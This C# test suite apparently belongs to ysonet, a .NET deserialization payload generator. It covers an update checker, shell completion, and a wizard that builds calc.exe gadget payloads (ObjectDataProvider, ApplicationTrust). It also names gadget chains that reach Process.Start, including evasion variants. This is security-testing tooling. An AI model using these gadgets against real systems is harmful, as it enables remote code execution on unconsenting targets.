            AssertTrue(odpFormatters.Contains("Json.NET"), "ObjectDataProvider supports Json.NET");

            var odpOptions = CliListing.GadgetOptions("ObjectDataProvider");
            AssertTrue(odpOptions.Contains("--variant"), "ObjectDataProvider exposes --variant");
            AssertTrue(odpOptions.Contains("--xamlurl"), "ObjectDataProvider exposes --xamlurl");

            var vsOptions = CliListing.PluginOptions("ViewState");
            AssertTrue(vsOptions.Count > 5, "ViewState plugin exposes options");
            AssertTrue(vsOptions.Contains("-g") || vsOptions.Contains("--gadget"), "ViewState exposes a gadget option");

            // Unknown names return empty, not an exception.
            AssertEqual(0, CliListing.GadgetFormatters("NoSuchGadget").Count, "unknown gadget -> empty");
            AssertEqual(0, CliListing.PluginOptions("NoSuchPlugin").Count, "unknown plugin -> empty");
        }

        // Drift guard: every top-level CLI option the tool defines must be known
        // to the PowerShell completion script, so adding an option to Program.cs
        // without updating the script fails the build.
        private static void UpdateCheckerNormalize()
        {
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("ysonet/v2026.7.4"), "repo prefix + v stripped");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("v2026.7.4"), "leading v stripped");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("V2026.7.4"), "uppercase V stripped");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("2026.7.4"), "already bare is unchanged");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("  ysonet/v2026.7.4  "), "surrounding space trimmed");
            AssertEqual("", UpdateChecker.NormalizeVersion(""), "empty stays empty");
            AssertEqual("", UpdateChecker.NormalizeVersion(null), "null is safe");
        }

        private static void UpdateCheckerLooksLikeVersion()
        {
            AssertTrue(UpdateChecker.LooksLikeVersion("2026"), "single number is a version");
            AssertTrue(UpdateChecker.LooksLikeVersion("2026.7"), "two parts is a version");
            AssertTrue(UpdateChecker.LooksLikeVersion("2026.7.4"), "three parts is a version");
            AssertTrue(!UpdateChecker.LooksLikeVersion("nightly"), "a word is not a version");
            AssertTrue(!UpdateChecker.LooksLikeVersion("2026.7.4-rc1"), "a pre-release suffix is not a plain version");
            AssertTrue(!UpdateChecker.LooksLikeVersion("v2026.7.4"), "the v must be normalized off first");
            AssertTrue(!UpdateChecker.LooksLikeVersion(""), "empty is not a version");
            AssertTrue(!UpdateChecker.LooksLikeVersion(null), "null is not a version");
        }

        private static void UpdateCheckerCompares()
        {
            // A newer latest at any position returns > 0.
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.4", "v2026.7.5") > 0, "patch bump is newer");
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.4", "v2026.8.1") > 0, "month bump is newer");
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.4", "v2027.1.1") > 0, "year bump is newer");
            // Equal, tolerating the repo tag prefix and a missing trailing part.
            AssertEqual(0, UpdateChecker.CompareVersions("v2026.7.4", "ysonet/v2026.7.4"), "same version, tag prefix");
            AssertEqual(0, UpdateChecker.CompareVersions("v2026.7", "v2026.7.0"), "missing part counts as 0");
            AssertEqual(0, UpdateChecker.CompareVersions("", ""), "two empties are equal");
            // Current newer returns < 0, and the compare must be numeric not lexical.
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.5", "v2026.7.4") < 0, "older latest is not an update");
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.10", "v2026.7.9") < 0, "10 is newer than 9 (numeric)");
            // Unknown current (empty) sorts oldest, so any real release looks newer.
            AssertTrue(UpdateChecker.CompareVersions("", "v2026.7.4") > 0, "unknown current is treated as oldest");
        }

        private static void UpdateCheckerParsesRelease()
        {
            string tag, url;
            string json = "{\"tag_name\":\"ysonet/v2026.7.5\",\"html_url\":\"https://example/releases/v2026.7.5\"}";
            AssertTrue(UpdateChecker.TryParseRelease(json, out tag, out url), "parses valid release json");
            AssertEqual("ysonet/v2026.7.5", tag, "tag_name read");
            AssertEqual("https://example/releases/v2026.7.5", url, "html_url read");
            AssertEqual("2026.7.5", UpdateChecker.NormalizeVersion(tag), "tag normalized to bare version");

            // A tag with no html_url still parses; url comes back null.
            AssertTrue(UpdateChecker.TryParseRelease("{\"tag_name\":\"ysonet/v1.2.3\"}", out tag, out url), "tag-only parses");
            AssertEqual("ysonet/v1.2.3", tag, "tag read without url");
            AssertTrue(url == null, "url is null when absent");

            // Rejections: no tag, non-json, empty, null.
            AssertTrue(!UpdateChecker.TryParseRelease("{\"html_url\":\"x\"}", out tag, out url), "rejects json with no tag");
            AssertTrue(!UpdateChecker.TryParseRelease("not json", out tag, out url), "rejects non-json");
            AssertTrue(!UpdateChecker.TryParseRelease("", out tag, out url), "rejects empty");
            AssertTrue(!UpdateChecker.TryParseRelease(null, out tag, out url), "rejects null");
        }

        private static void UpdateCheckerCheckEvents()
        {
            Func<string, string> latest79 = url =>
                "{\"tag_name\":\"ysonet/v2026.7.9\",\"html_url\":\"https://example/latest\"}";

            // A newer release is available.
            var up = UpdateChecker.Check("v2026.7.4", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.UpdateAvailable, up.Status, "newer -> UpdateAvailable");
            AssertTrue(up.Succeeded, "update-available is a completed check");
            AssertTrue(up.UpdateAvailable, "UpdateAvailable convenience prop is true");
            AssertEqual("v2026.7.9", up.LatestVersion, "latest normalized to vX");

            // Running the latest.
            var same = UpdateChecker.Check("v2026.7.9", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.UpToDate, same.Status, "equal -> UpToDate");
            AssertTrue(same.Succeeded && !same.UpdateAvailable, "up-to-date is not an update");

            // Local build ahead of the latest release (the "time machine" case).
            var ahead = UpdateChecker.Check("v2026.8.1", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.Ahead, ahead.Status, "current newer -> Ahead");
            AssertTrue(ahead.Succeeded && !ahead.UpdateAvailable, "ahead is a completed check, not an update");

            // Unknown current version -> any release looks newer.
            var unknown = UpdateChecker.Check("", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.UpdateAvailable, unknown.Status, "unknown current -> update available");

            // A tag without the repo prefix is compared just the same.
            Func<string, string> bareTag = url => "{\"tag_name\":\"v2026.7.9\"}";
            AssertEqual(UpdateChecker.UpdateStatus.UpToDate, UpdateChecker.Check("v2026.7.9", bareTag).Status, "bare tag compares");
        }

        private static void UpdateCheckerCheckErrors()
        {
            // Network failure (timeout, offline, HTTP error) is captured, never thrown.
            Func<string, string> boom = url => { throw new Exception("timed out"); };
            var unreachable = UpdateChecker.Check("v2026.7.4", boom);
            AssertEqual(UpdateChecker.UpdateStatus.Unreachable, unreachable.Status, "throw -> Unreachable");
            AssertTrue(!unreachable.Succeeded, "unreachable is not a successful check");
            AssertTrue(unreachable.Error != null && unreachable.Error.Contains("timed out"), "error carries the reason");

            // A null fetcher is treated as unreachable, not a crash.
            var noFetch = UpdateChecker.Check("v2026.7.4", null);
            AssertEqual(UpdateChecker.UpdateStatus.Unreachable, noFetch.Status, "null fetch -> Unreachable");

            // Reached GitHub but the body is not a release object.
            var junk = UpdateChecker.Check("v2026.7.4", url => "<html>nope</html>");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, junk.Status, "non-release body -> Unparseable");
            AssertTrue(!junk.Succeeded && !string.IsNullOrEmpty(junk.Error), "unparseable is a failure with a message");

            // An empty body.
            var empty = UpdateChecker.Check("v2026.7.4", url => "");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, empty.Status, "empty body -> Unparseable");

            // A tag present but not a recognizable version (release format changed).
            var weird = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"nightly\"}");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, weird.Status, "unrecognized tag -> Unparseable");
            AssertEqual("nightly", weird.LatestVersion, "raw tag kept for display");

            // A pre-release suffix cannot be compared safely -> Unparseable.
            var rc = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"ysonet/v2026.7.4-rc1\"}");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, rc.Status, "pre-release suffix -> Unparseable");
        }

        private static void UpdateCheckerCheckUrlAndCurrent()
        {
            // The API html_url is used when present.
            var withUrl = UpdateChecker.Check("v2026.7.4",
                url => "{\"tag_name\":\"ysonet/v2026.7.9\",\"html_url\":\"https://example/rel\"}");
            AssertEqual("https://example/rel", withUrl.ReleaseUrl, "html_url used when present");

            // Falls back to the releases page when the API gives no html_url.
            var noUrl = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"ysonet/v2026.7.9\"}");
            AssertEqual(UpdateChecker.ReleasesPageUrl, noUrl.ReleaseUrl, "fallback url when html_url absent");

            // Error paths keep the fallback link so the user always has somewhere to go.
            var boom = UpdateChecker.Check("v2026.7.4", url => { throw new Exception("x"); });
            AssertEqual(UpdateChecker.ReleasesPageUrl, boom.ReleaseUrl, "unreachable keeps the fallback link");
            var junk = UpdateChecker.Check("v2026.7.4", url => "not json");
            AssertEqual(UpdateChecker.ReleasesPageUrl, junk.ReleaseUrl, "unparseable keeps the fallback link");

            // The current version is echoed back in the result for display.
            var r = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"ysonet/v2026.7.4\"}");
            AssertEqual("v2026.7.4", r.CurrentVersion, "current version preserved");
        }

        private static void CompletionScriptCoversOptions()
        {
            string script = ReadCompletionScript();

            // Dev-only options intentionally left out of completion.
            var omitted = new HashSet<string>(StringComparer.Ordinal) { "--runmytest" };

            foreach (string token in CliListing.OptionTokens(ysonet.Program.options))
            {
                if (omitted.Contains(token))
                    continue;
                // The script lists tokens as quoted literals, e.g. '--gadget'.
                AssertTrue(script.Contains("'" + token + "'"),
                    "completion script must know option '" + token + "' (add it to tools/completions/ysonet.ps1)");
            }
        }

        // Drift guard: the script must read its value lists live from `--list`
        // (not hardcode them), and its --list category set must match the tool.
        private static void CompletionScriptValueLists()
        {
            string script = ReadCompletionScript();

            AssertTrue(script.Contains("--list"), "script drives value lists via --list");

            foreach (string category in CliListing.ListCategories)
            {
                AssertTrue(script.Contains("'" + category + "'"),
                    "script must reference --list category '" + category + "'");
            }
        }

        private static void CompletionScriptEmbedded()
        {
            string s = CompletionCommand.LoadPowerShellScript();
            AssertTrue(!string.IsNullOrEmpty(s), "embedded completion script present");
            AssertTrue(s.Contains("Register-ArgumentCompleter"), "script registers a completer");
            AssertTrue(s.Contains("--list"), "embedded script drives values via --list");
        }

        private static void CompletionProfileBlock()
        {
            string exe = @"C:\tools\ysonet.exe";

            // Insert into an empty profile.
            string t0 = CompletionCommand.AddOrUpdateBlock("", exe);
            AssertTrue(t0.Contains("$env:YSONET_EXE = 'C:\\tools\\ysonet.exe'"), "block sets exe path");
            AssertTrue(t0.Contains("completion powershell"), "block loads the script");

            // Installing again with the same exe is a no-op.
            string t1 = CompletionCommand.AddOrUpdateBlock(t0, exe);
            AssertEqual(t0, t1, "install is idempotent");

            // A different exe path replaces in place, leaving a single block.
            string t2 = CompletionCommand.AddOrUpdateBlock(t0, @"D:\ysonet.exe");
            AssertEqual(1, CountOccurrences(t2, "YSONET_EXE"), "only one managed block after update");
            AssertTrue(t2.Contains(@"D:\ysonet.exe"), "block refreshed to new exe path");

            // Surrounding profile content survives install and uninstall.
            string user = "Set-Alias ll Get-ChildItem" + Environment.NewLine;
            string withBlock = CompletionCommand.AddOrUpdateBlock(user, exe);
            AssertTrue(withBlock.Contains("Set-Alias ll Get-ChildItem"), "user content kept on install");

            string removed = CompletionCommand.RemoveBlock(withBlock);
            AssertTrue(removed.Contains("Set-Alias ll Get-ChildItem"), "user content kept on uninstall");
            AssertTrue(!removed.Contains("YSONET_EXE"), "managed block gone after uninstall");

            // When our block is the whole profile, removal leaves nothing, so
            // uninstall deletes the file instead of leaving an empty one.
            AssertTrue(string.IsNullOrWhiteSpace(CompletionCommand.RemoveBlock(t0)),
                "block-only profile becomes empty on uninstall");
        }

        private static void CompletionPolicyClassifier()
        {
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile("AllSigned"), "AllSigned blocks");
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile("Restricted"), "Restricted blocks");
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile(" allsigned "), "case/space insensitive");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("RemoteSigned"), "RemoteSigned allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("Bypass"), "Bypass allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("Unrestricted"), "Unrestricted allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile(""), "empty is not a block");
        }

        private static void CompletionShellClassifier()
        {
            AssertEqual(CompletionCommand.ShellKind.PowerShellCore, CompletionCommand.ClassifyShell("pwsh"), "pwsh");
            AssertEqual(CompletionCommand.ShellKind.PowerShellCore, CompletionCommand.ClassifyShell("pwsh.exe"), "pwsh.exe");
            AssertEqual(CompletionCommand.ShellKind.WindowsPowerShell, CompletionCommand.ClassifyShell("powershell"), "powershell");
            AssertEqual(CompletionCommand.ShellKind.Cmd, CompletionCommand.ClassifyShell("cmd"), "cmd");
            AssertEqual(CompletionCommand.ShellKind.Posix, CompletionCommand.ClassifyShell("bash"), "bash");
            AssertEqual(CompletionCommand.ShellKind.Unknown, CompletionCommand.ClassifyShell("notepad"), "unknown app");
        }

        private static int CountOccurrences(string haystack, string needle)
        {
            int count = 0, i = 0;
            while ((i = haystack.IndexOf(needle, i, StringComparison.Ordinal)) >= 0)
            {
                count++;
                i += needle.Length;
            }
            return count;
        }

        // Locate tools/completions/ysonet.ps1 by walking up from the test binary,
        // so no absolute/machine path is baked in.
        private static string ReadCompletionScript()
        {
            string rel = Path.Combine("tools", "completions", "ysonet.ps1");
            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            while (dir != null)
            {
                string candidate = Path.Combine(dir.FullName, rel);
                if (File.Exists(candidate))
                    return File.ReadAllText(candidate);
                dir = dir.Parent;
            }
            throw new Exception("could not locate " + rel + " above " + AppDomain.CurrentDomain.BaseDirectory);
        }

        private static void WizardEndToEnd()
        {
            // Drive the editor to build ObjectDataProvider + Json.NET + calc.exe.
            // The command defaults to calc.exe, so only the formatter is changed,
            // then Generate. Compare to the core-generated bytes.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top menu -> gadget payload (index 0)
            keys.Type("ObjectDataProvider").Enter(); // module picker: filter + pick
            keys.Type("formatter").Enter();          // form: open the formatter setting
            keys.Digit(2);                           // choice menu -> Json.NET (index 1)
            keys.Type("Generate").Enter();           // form: run Generate
            keys.Escape();                           // leave the settings form
            keys.Escape();                           // leave the module list
            keys.Escape();                           // top menu -> quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] expected = GenerateOdpJson("calc.exe");

            AssertTrue(got.Length > 0, "wizard wrote a payload to stdout stream");
            AssertTrue(BytesEqual(got, expected), "wizard payload equals core payload");
            AssertTrue(stderr.Contains("ysonet.exe -g ObjectDataProvider -f Json.NET -c calc.exe"),
                "equivalent command echoed to stderr");
            AssertTrue(!Encoding.UTF8.GetString(got).Contains("Equivalent command"),
                "prompts did not leak into the payload stream");
        }

        private static void MenuNavigation()
        {
            var keys = new ScriptedKeyReader();
            keys.Down().Down().Enter();   // 0 -> 1 -> 2, select index 2
            Menu m = new Menu(keys);
            int i = WithSwallowedError(() => m.Show("pick", new List<string> { "a", "b", "c" }, 0));
            AssertEqual(2, i, "arrows moved to index 2");
        }

        private static void MenuDigitAndCancel()
        {
            Menu m1 = new Menu(new ScriptedKeyReader().Digit(2));
            int i = WithSwallowedError(() => m1.Show("pick", new List<string> { "a", "b", "c" }, 0));
            AssertEqual(1, i, "digit 2 selects index 1");

            Menu m2 = new Menu(new ScriptedKeyReader().Escape());
            int c = WithSwallowedError(() => m2.Show("pick", new List<string> { "a", "b" }, 0));
            AssertEqual(-1, c, "escape cancels with -1");
        }

        private static void PickerShowSelectAndCancel()
        {
            var keys = new ScriptedKeyReader().Type("Beta").Enter();
            Picker p = new Picker(keys);
            string sel = WithSwallowedError(() =>
                p.Show("pick", new List<string> { "Alpha", "Beta", "Gamma" }, null));
            AssertEqual("Beta", sel, "typed filter then Enter selects");

            Picker p2 = new Picker(new ScriptedKeyReader().Escape());
            string cancelled = WithSwallowedError(() =>
                p2.Show("pick", new List<string> { "Alpha", "Beta" }, null));
            AssertTrue(cancelled == null, "escape cancels to null");
        }

        private static void MenuRedrawsInPlace()
        {
            // Only meaningful with a real console cursor. Under a redirected stderr
            // (this test harness, CI) the widget appends by design, so there is
            // nothing to measure - treat as a pass. In a real terminal this asserts
            // that N navigation keys do NOT print N copies of the menu (the bug we
            // fixed: absolute-row caching that broke when the buffer scrolled).
            if (!ysonet.Interactive.ConsoleCursor.CanControl())
                return;

            var items = new List<string> { "a", "b", "c", "d", "e" };
            int before = Console.CursorTop;
            var keys = new ScriptedKeyReader().Down().Down().Down().Enter();
            new Menu(keys).Show("pick", items, 0);
            int after = Console.CursorTop;

            // In-place redraw advances the cursor by about one menu block
            // (title + items), not by block-height per keystroke.
            int advanced = after - before;
            AssertTrue(advanced <= items.Count + 3,
                "cursor advanced by ~one block, not once per keypress (advanced=" + advanced + ")");
        }

        private static void MenuShowsNumbersAndHint()
        {
            var keys = new ScriptedKeyReader().Enter();
            var err = new StringWriter();
            TextWriter saved = Console.Error;
            Console.SetError(err);
            try { new Menu(keys).Show("pick", new List<string> { "Alpha", "Beta", "Gamma" }, 0); }
            finally { Console.SetError(saved); }

            string s = err.ToString();
            AssertTrue(s.Contains("1.") && s.Contains("Alpha"), "menu items are numbered");
            AssertTrue(s.Contains("Esc to go back"), "menu shows the key hint");
        }

        private static void WizardAdvancedOptions()
        {
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("minify").Enter();             // open the minify flag
            keys.Digit(1);                           // on (index 0)
            keys.Type("Generate").Enter();
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] expected = GenerateOdpJson("calc.exe", true);

            AssertTrue(got.Length > 0, "payload produced");
            AssertTrue(BytesEqual(got, expected), "minified wizard payload equals minified core payload");
            AssertTrue(stderr.Contains("--minify"), "echoed command shows --minify");
        }

        private static void WizardOutputToFile()
        {
            string file = TestArtifactPath("ysonet_wizard_test_out.bin");
            if (File.Exists(file)) File.Delete(file);

            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("outputpath").Enter();         // open output path
            keys.TypeLine(file);                     // set the file
            keys.Type("Generate").Enter();
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "nothing written to the stdout stream");
            AssertTrue(File.Exists(file), "file was written");
            byte[] fileBytes = File.ReadAllBytes(file);
            AssertTrue(BytesEqual(fileBytes, GenerateOdpJson("calc.exe", false)), "file bytes equal core payload");
            File.Delete(file);
        }

        private static void WizardCancelAtPicker()
        {
            var keys = new ScriptedKeyReader();
            keys.Enter();     // top -> gadget
            keys.Escape();    // cancel the module list -> back to top
            keys.Escape();    // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);
            AssertEqual(0, stdout.Length, "cancelling emits no payload");
        }

        private static void WizardEscAtTextPrompt()
        {
            // Open a text setting, press Esc: the edit cancels back to the settings
            // form (not stuck at the prompt), and nothing is generated.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("command").Enter();            // open the command text setting
            keys.Escape();                           // Esc at the prompt -> back to the form
            keys.Escape();                           // leave the form -> module list
            keys.Escape();                           // leave the module list -> top
            keys.Escape();                           // top menu -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);
            AssertEqual(0, stdout.Length, "Esc at a text prompt emits no payload");
        }

        private static void WizardPluginPath()
        {
            var keys = new ScriptedKeyReader();
            keys.Digit(2);                          // top -> plugin (index 1)
            keys.Type("ApplicationTrust").Enter();  // module picker
            keys.Type("command").Enter();           // open the command setting
            keys.TypeLine("calc.exe");              // set it
            keys.Type("Generate").Enter();
            keys.Escape();                          // leave form
            keys.Escape();                          // leave module list
            keys.Escape();                          // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);

            // The editor mirrors the plugin's own default (usesimpletype on), so the
            // core comparison passes the same flag. It does not change the payload
            // here (no minify), but keeps the two argv builds equivalent.
            RunResult core = PayloadRunner.RunPlugin("ApplicationTrust",
                new string[] { "-p", "ApplicationTrust", "--command", "calc.exe", "--usesimpletype" });
            AssertTrue(core.Success, "core plugin ran");
            int len;
            byte[] expected = PayloadRunner.Encode(core.Raw, "raw", out len);

            AssertTrue(got.Length > 0, "plugin payload produced");
            AssertTrue(BytesEqual(got, expected), "wizard plugin payload equals core payload");
            AssertTrue(stderr.Contains("-p ApplicationTrust"), "echoed plugin command");
        }

        private static void CommandInputTypes()
        {
            // Each gadget declares what -c means; the wizard relies on this.
            AssertEqual(CommandInputType.ShellCommand, Gadget("ObjectDataProvider").CommandInput(), "ODP is a shell command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateSelector").CommandInput(), "ASS ignores the command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateDisableTypeCheck").CommandInput(), "ASDTC ignores the command");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("ActivitySurrogateSelectorFromFile").CommandInput(), "ASSFromFile takes a .cs file");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("XamlAssemblyLoadFromFile").CommandInput(), "XamlAssemblyLoadFromFile takes a .cs file");
            AssertEqual(CommandInputType.DllPath, Gadget("BaseActivationFactory").CommandInput(), "BaseActivationFactory takes a DLL path");
            AssertEqual(CommandInputType.DllPath, Gadget("GetterCompilerResults").CommandInput(), "GetterCompilerResults takes a DLL path");
            AssertEqual(CommandInputType.Url, Gadget("ObjRef").CommandInput(), "ObjRef takes a URL");
            AssertEqual(CommandInputType.FilePath, Gadget("XamlImageInfo").CommandInput(), "XamlImageInfo takes a file path");
            // A path the TARGET touches, not a file read here. FileLogTraceListener was
            // moved off FilePath for exactly that reason: the FilePath help says "this
            // gadget reads the file", which was never true of it.
            AssertEqual(CommandInputType.TargetPath, Gadget("FileLogTraceListener").CommandInput(),
                "FileLogTraceListener takes a path on the target");
            AssertEqual(CommandInputType.TargetPathAndLocalFile,
                Gadget("TypeConfuseDelegateFileOperations").CommandInput(),
                "TypeConfuseDelegateFileOperations defaults to target path + local content file");

            // Prompt labels follow the type.
            AssertEqual("Command to run", Wizard.CommandLabel(CommandInputType.ShellCommand), "shell label");
            AssertEqual("Path to .dll", Wizard.CommandLabel(CommandInputType.DllPath), "dll label");
            AssertEqual("URL", Wizard.CommandLabel(CommandInputType.Url), "url label");
            AssertEqual("calc.exe", Wizard.CommandDefault(CommandInputType.ShellCommand), "shell default");
            AssertEqual("", Wizard.CommandDefault(CommandInputType.DllPath), "dll has no default");

            // Every input type needs its own menu name, prompt label and help sentence, or
            // a new one silently inherits the shell-command wording. The help must also say
            // whose file system a path belongs to, which is the whole point of the split.
            var seenNames = new HashSet<string>(StringComparer.Ordinal);
            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
            {
                AssertTrue(seenNames.Add(Wizard.InputTypeName(t)),
                    "CommandInputType." + t + " has its own menu name");
                AssertTrue(!string.IsNullOrEmpty(Wizard.CommandLabel(t)),
                    "CommandInputType." + t + " has a prompt label");
                AssertTrue(!string.IsNullOrEmpty(Wizard.CommandHelp(t)),
                    "CommandInputType." + t + " has help text");
            }
            // A path or URL has no sensible default; only the shell-style inputs get one.
            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
            {
                bool shellStyle = t == CommandInputType.ShellCommand || t == CommandInputType.Ignored;
                AssertEqual(shellStyle ? "calc.exe" : "", Wizard.CommandDefault(t),
                    "CommandInputType." + t + " default value");
            }
            foreach (CommandInputType t in new[] { CommandInputType.TargetPath,
                CommandInputType.TargetPathPair, CommandInputType.TargetPathAndLocalFile })
                AssertTrue(Wizard.CommandHelp(t).Contains("TARGET"),
                    "CommandInputType." + t + " help says the path belongs to the target");
            AssertTrue(Wizard.CommandHelp(CommandInputType.TargetPathAndLocalFile).Contains("THIS machine"),
                "the write help also names the operator-side file");
            AssertTrue(Wizard.CommandHelp(CommandInputType.FilePath).Contains("HERE"),
                "FilePath help says the file is read on this machine");
        }

        private static void IgnoredCommandGadget()
        {
            // ActivitySurrogateDisableTypeCheck ignores -c (it just flips a protection
            // flag). It must generate with no command, and both the CLI and the
            // interactive editor must treat the command as unneeded.
            const string name = "ActivitySurrogateDisableTypeCheck";
            AssertEqual(CommandInputType.Ignored, Gadget(name).CommandInput(), "gadget ignores the command");

            // Interactive: the command and rawcmd fields are hidden, command not required.
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest(name);
            EditableField cmd = FindEditable(fields, "command");
            EditableField rawcmd = FindEditable(fields, "rawcmd");
            AssertTrue(cmd != null && cmd.Hidden && !cmd.Required, "command field hidden and optional");
            AssertTrue(rawcmd != null && rawcmd.Hidden, "rawcmd field hidden");

            // The equivalent command line omits -c when there is no command.
            var tokens = CommandEcho.GadgetTokens(name, "LosFormatter", "",
                false, false, "", "", "", false, false, false, false, null);
            AssertTrue(!tokens.Contains("-c"), "no -c token for an ignored command");

            // Core generation succeeds with an empty command.
            InputArgs ia = new InputArgs();
            ia.Cmd = "";
            GenerationRequest req = new GenerationRequest();
            req.GadgetName = name;
            req.FormatterName = "LosFormatter";
            req.OutputFormat = "";
            req.InputArgs = ia;
            RunResult r = PayloadRunner.GenerateGadget(req);
            AssertTrue(r.Success, "generates with no command: " + r.ErrorMessage);
            AssertTrue(r.Raw != null, "produced a payload");
        }

        private static IGenerator Gadget(string name)
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
            if (g == null)
                throw new Exception("gadget not found: " + name);
            return g;
        }

        private static void GadgetsDeclareVariants()
        {
            AssertEqual(4, Gadget("ObjectDataProvider").Variants().Count, "ODP declares 4 variants");
            AssertEqual(2, Gadget("XamlImageInfo").Variants().Count, "XamlImageInfo declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelector").Variants().Count, "ASS declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelectorFromFile").Variants().Count, "ASSFromFile inherits 2 variants");
            AssertEqual(2, Gadget("ResourceSet").Variants().Count, "ResourceSet (ig option) declares 2 variants");

            // TypeConfuseDelegate selects the serialized ROOT CONTAINER that carries the
            // same Comparison<string> -> Process.Start splice. Variant 1 is the original
            // SortedSet default; 2 and 3 are the SortedSet-wire-name evasion roots.
            var tcd = Gadget("TypeConfuseDelegate").Variants();
            AssertEqual(3, tcd.Count, "TypeConfuseDelegate declares 3 container variants");
            for (int i = 0; i < tcd.Count; i++)
            {
                AssertEqual(i + 1, tcd[i].Number, "TypeConfuseDelegate variant " + (i + 1) + " is numbered " + (i + 1));
                AssertTrue(!string.IsNullOrEmpty(tcd[i].Label), "TypeConfuseDelegate variant " + (i + 1) + " carries a label");
                AssertEqual(0, tcd[i].UnsupportedFormatters.Count,
                    "TypeConfuseDelegate variant " + (i + 1) + " opts out of no formatter (the container swap does not narrow the set)");
            }
            AssertTrue(tcd[0].Label.IndexOf("SortedSet", StringComparison.OrdinalIgnoreCase) >= 0, "variant 1 is labelled SortedSet");
            AssertTrue(tcd[1].Label.IndexOf("SortedDictionary", StringComparison.OrdinalIgnoreCase) >= 0, "variant 2 is labelled SortedDictionary");
            AssertTrue(tcd[2].Label.IndexOf("TreeSet", StringComparison.OrdinalIgnoreCase) >= 0, "variant 3 is labelled TreeSet");

            var v = Gadget("ObjectDataProvider").Variants();
            AssertEqual(1, v[0].Number, "first variant is number 1");
            AssertTrue(!string.IsNullOrEmpty(v[0].Label), "variants carry a label");
        }

        private static void VariantInputTypes()
        {
            // XamlImageInfo is the reference case: its variants take different -c
            // inputs, so each variant declares its own. Variant 1 reads a file,
            // variant 2 runs a command.
            var xii = Gadget("XamlImageInfo");
            var vs = xii.Variants();
            AssertEqual(CommandInputType.FilePath, vs[0].EffectiveInput(xii.CommandInput()), "XamlImageInfo v1 = file path");
            AssertEqual(CommandInputType.ShellCommand, vs[1].EffectiveInput(xii.CommandInput()), "XamlImageInfo v2 = shell command");

            // A variant with no declared input falls back to the gadget default.
            var odp = Gadget("ObjectDataProvider");
            var ov = odp.Variants();
            AssertEqual(odp.CommandInput(), ov[0].EffectiveInput(odp.CommandInput()), "ODP variant inherits the gadget input");
            AssertTrue(!ov[0].Input.HasValue, "ODP variant declares no per-variant input");
        }

        private static void VariantFormatterOptOutDataModel()
        {
            // The per-variant opt-out data model: a variant can NARROW the gadget's
            // formatters, and the check is first-token and case-insensitive, matching
            // IsSupported / the wizard's FormatterTokens.
            var narrowed = new GadgetVariant(1, "x").Without("SoapFormatter");
            AssertTrue(!narrowed.SupportsFormatter("SoapFormatter"), "an opted-out formatter is not supported");
            AssertTrue(narrowed.SupportsFormatter("BinaryFormatter"), "a different formatter is still supported");
            // Robust token match: a listed value carrying a suffix still matches the opt-out.
            AssertTrue(!narrowed.SupportsFormatter("SoapFormatter (2)"), "opt-out matches on the first token, not the whole string");
